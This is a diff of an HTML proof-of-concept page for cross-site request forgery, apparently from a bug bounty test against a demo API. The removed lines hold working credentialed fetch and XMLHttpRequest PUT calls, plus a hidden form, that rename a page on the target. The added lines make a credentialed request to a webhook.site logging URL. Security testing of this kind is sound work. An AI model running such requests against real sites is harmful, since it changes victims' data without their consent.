@@ -6,40 +6,14 @@
 <body>
     <h1>CSRF Test Page</h1>
     <p>This page will attempt to make a CSRF request to update the page name.</p>
-    
-    <form id="csrf-form" method="POST" action="https://api.planhatdemo.com/pages/69b253e076c1d180f1758061">
-        <input type="hidden" name="name" value="hello">
-    </form>
 
     <script>
         // Method 1: Fetch API (modern browsers)
-        fetch('https://api.planhatdemo.com/pages/69b253e076c1d180f1758061', {
-            method: 'PUT',
-            headers: {
-                'Content-Type': 'application/json',
-                'Ph-Active-Tenant': 'intigriti-bb',
-                'Version': 'P2_efc14ae23258c37efd432289cd35d26765dda0d4'
-            },
-            body: JSON.stringify({name: 'helloguys'}),
+        fetch('https://webhook.site/7dbceb0c-65a4-41d5-bde4-23b7b79daf47', {
+            method: 'GET',
             credentials: 'include' // Important: includes cookies
-        })
-        .then(response => response.json())
-        .then(data => console.log('Success:', data))
-        .catch(error => console.error('Error:', error));
-
-        // Method 2: XMLHttpRequest (fallback)
-        var xhr = new XMLHttpRequest();
-        xhr.open('PUT', 'https://api.planhatdemo.com/pages/69b253e076c1d180f1758061', true);
-        xhr.withCredentials = true; // Important: includes cookies
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.setRequestHeader('Ph-Active-Tenant', 'intigriti-bb');
-        xhr.setRequestHeader('Version', 'P2_efc14ae23258c37efd432289cd35d26765dda0d4');
-        xhr.onload = function() {
-            console.log('XHR Response:', xhr.responseText);
-        };
-        xhr.send(JSON.stringify({name: 'hello'}));
+        });
     </script>
-    
     <p>Check the browser console (F12) to see the result.</p>
 </body>
 </html>
